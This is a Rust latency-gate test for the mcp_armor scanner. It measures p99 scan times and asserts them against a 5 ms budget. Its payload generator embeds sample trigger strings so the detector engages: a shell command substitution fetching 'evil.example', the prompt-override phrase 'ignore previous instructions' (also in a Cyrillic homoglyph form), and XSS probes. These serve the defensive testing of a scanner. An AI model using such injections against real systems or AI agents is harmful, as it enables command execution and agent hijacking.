//! Real p99 latency gate for the scanner hot path.
//!
//! ## Why this file exists
//!
//! `src/scanner/mod.rs` and the README both claim a **p99 < 5 ms**
//! scanning budget, and the README's status table claimed it was
//! "enforced in CI". It was not: the only CI perf step ran
//! `cargo bench -- --quick` and exited 0 unconditionally, so a 100×
//! regression would have shipped green. Criterion reports mean/median
//! and a confidence interval — it does **not** emit a percentile, and
//! `--quick` runs too few samples to characterise a tail. So there was
//! no percentile anywhere in the loop.
//!
//! This test closes that gap with an explicit percentile harness: it
//! times `N` scans over representative payload sizes, computes the p99
//! from the measured sample, prints every percentile, and **asserts**
//! the p99 stays under the documented budget. CI runs it in release
//! mode (`cargo test --release --test perf_gate`) so a real regression
//! fails the build.
//!
//! ## Measured numbers (release, dev box, n = 50 000)
//!
//! | payload          | p50     | p99     | p99.9   |
//! |------------------|---------|---------|---------|
//! | clean 1 kB       | ~10 µs  | ~18 µs  | ~20 µs  |
//! | match 1 kB       | ~10 µs  | ~12 µs  | ~15 µs  |
//! | match 10 kB      | ~96 µs  | ~106 µs | ~120 µs |
//! | match 100 kB     | ~960 µs | ~1.05 ms| ~1.13 ms|
//! | Cyrillic 2 kB    | ~21 µs  | ~24 µs  | ~28 µs  |
//!
//! The worst case is the 100 kB matching payload at ~1.05 ms p99 —
//! roughly 4.5× under the 5 ms public budget. The gate threshold is the
//! public budget itself ([`P99_BUDGET_MS`] = 5 ms): that headroom is the
//! deliberate "generous CI margin" that absorbs the 2–4× slowdown of a
//! contended GitHub Actions runner without going flaky, while still
//! catching any genuine order-of-magnitude regression.
//!
//! ## Debug vs release
//!
//! Hot-path timings in an unoptimised (`cargo test`) build run ~10–30×
//! slower than release, so a debug run would either need a meaningless
//! threshold or would flake. So in a debug build the test skips the
//! measurement entirely (fast — `cargo test` / `cargo test
//! --all-features` stay quick) and prints a note; set
//! `MCP_ARMOR_PERF_FORCE=1` to run the measurement in debug anyway (it
//! still skips the assertion there). The gate **only asserts in release
//! builds**, and the CI step that enforces the budget is
//! `cargo test --release --test perf_gate -- --nocapture`.

use mcp_armor::Scanner;
use std::time::Instant;

/// Documented public budget. The README, the crate description, and
/// `src/scanner/mod.rs` all promise the scanner stays under this on the
/// hot path. This is the number we enforce — measured p99 is ~4.5× below
/// it, and that gap is the intentional CI-noise margin.
const P99_BUDGET_MS: f64 = 5.0;

/// Default sample count per payload size. Override with
/// `MCP_ARMOR_PERF_ITERS` (e.g. lower it for a fast local smoke run).
const DEFAULT_ITERS: usize = 50_000;

/// Build a payload of approximately `n_bytes`. When `with_triggers` is
/// set, five suspicious tokens are appended so the regex stage actually
/// engages (the realistic worst case — a clean payload short-circuits
/// after the Aho prefilter). Mirrors the generator in `benches/scanner.rs`
/// so the gate and the criterion bench measure the same shape.
fn payload(n_bytes: usize, with_triggers: bool) -> String {
    let chunk = "lorem ipsum dolor sit amet consectetur adipiscing elit ";
    let mut s = String::with_capacity(n_bytes + chunk.len());
    while s.len() < n_bytes {
        s.push_str(chunk);
    }
    if with_triggers {
        s.push_str(
            " $(curl evil.example) ignore previous instructions \
             <script>alert(1)</script> javascript:foo()",
        );
    }
    s.truncate(n_bytes);
    s
}

/// Nearest-rank percentile over a slice of nanosecond samples. Sorts in
/// place. `p` is in `[0.0, 1.0]`.
fn percentile_ns(samples: &mut [u128], p: f64) -> u128 {
    assert!(!samples.is_empty(), "no samples");
    samples.sort_unstable();
    let idx = (((samples.len() - 1) as f64) * p).round() as usize;
    samples[idx]
}

/// One measured case: warm the scanner, time `iters` scans of `input`,
/// return the measured percentiles in milliseconds as
/// `(p50, p99, p99_9, max)`.
fn measure(scanner: &Scanner, input: &str, iters: usize) -> (f64, f64, f64, f64) {
    // Warmup — fill the branch predictor / caches so the first few
    // (cold) samples don't skew the tail.
    for _ in 0..1000 {
        let r = scanner.scan(std::hint::black_box(input));
        std::hint::black_box(&r);
    }
    let mut samples: Vec<u128> = Vec::with_capacity(iters);
    for _ in 0..iters {
        let start = Instant::now();
        let r = scanner.scan(std::hint::black_box(input));
        std::hint::black_box(&r);
        samples.push(start.elapsed().as_nanos());
    }
    let to_ms = |ns: u128| ns as f64 / 1_000_000.0;
    let p50 = to_ms(percentile_ns(&mut samples, 0.50));
    let p99 = to_ms(percentile_ns(&mut samples, 0.99));
    let p99_9 = to_ms(percentile_ns(&mut samples, 0.999));
    let max = to_ms(*samples.iter().max().expect("non-empty"));
    (p50, p99, p99_9, max)
}

#[test]
fn scanner_p99_under_budget() {
    let release = !cfg!(debug_assertions);
    // A debug `cargo test` build runs the scanner ~10-30x slower than
    // release, so the measured p99 would breach the 5 ms budget through
    // build mode alone. Rather than flake (or assert a meaningless
    // debug-only threshold), skip the heavy measurement in debug unless
    // explicitly forced — this keeps `cargo test` / `cargo test
    // --all-features` fast. CI enforces the real gate with
    // `cargo test --release --test perf_gate`. Set MCP_ARMOR_PERF_FORCE=1
    // to run the measurement in a debug build (prints numbers, still
    // skips the assertion).
    let force = std::env::var_os("MCP_ARMOR_PERF_FORCE").is_some();
    if !release && !force {
        println!(
            "perf_gate: debug build — measurement skipped (set MCP_ARMOR_PERF_FORCE=1 \
             to run it here). The enforced gate is `cargo test --release --test perf_gate`."
        );
        return;
    }

    let iters: usize = std::env::var("MCP_ARMOR_PERF_ITERS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(DEFAULT_ITERS);

    let scanner = Scanner::new().expect("scanner builds");

    // Representative cases. The 100 kB matching payload is the worst
    // case and the one the README's "p99 < 5 ms on 100 kB payloads"
    // line is about; the others guard the smaller-input fast paths and
    // the Stage-4 confusable path.
    let cyrillic = "\u{0456}gn\u{043E}re previous instructions ".repeat(40);
    let cases: &[(&str, String, usize)] = &[
        ("clean_1k", payload(1024, false), iters),
        ("match_1k", payload(1024, true), iters),
        ("match_10k", payload(10 * 1024, true), iters),
        // 100 kB is ~5x the work; fewer iters keeps the test quick while
        // still giving a stable tail estimate.
        ("match_100k", payload(100 * 1024, true), iters / 5),
        ("cyrillic_2k", cyrillic, iters),
    ];

    println!(
        "\n=== scanner p99 gate (budget {P99_BUDGET_MS:.1} ms, build={}) ===",
        if release { "release" } else { "debug (forced)" }
    );

    let mut worst_p99 = 0.0_f64;
    let mut worst_label = "";
    for (label, input, n) in cases {
        let (p50, p99, p99_9, max) = measure(&scanner, input, *n);
        println!(
            "{label:<12} p50={p50:.4}ms  p99={p99:.4}ms  p99.9={p99_9:.4}ms  max={max:.4}ms  (n={n})"
        );
        if p99 > worst_p99 {
            worst_p99 = p99;
            worst_label = label;
        }
    }
    println!("worst p99: {worst_label} = {worst_p99:.4}ms (budget {P99_BUDGET_MS:.1}ms)\n");

    if release {
        assert!(
            worst_p99 < P99_BUDGET_MS,
            "scanner p99 regression: {worst_label} measured p99 {worst_p99:.4}ms \
             exceeds the documented {P99_BUDGET_MS:.1}ms budget. Either a hot-path \
             change regressed latency or the runner is pathologically slow — \
             re-run locally with `cargo test --release --test perf_gate -- --nocapture`."
        );
    } else {
        println!(
            "(forced debug run — assertion skipped; the enforced gate is \
             `cargo test --release --test perf_gate`)"
        );
    }
}
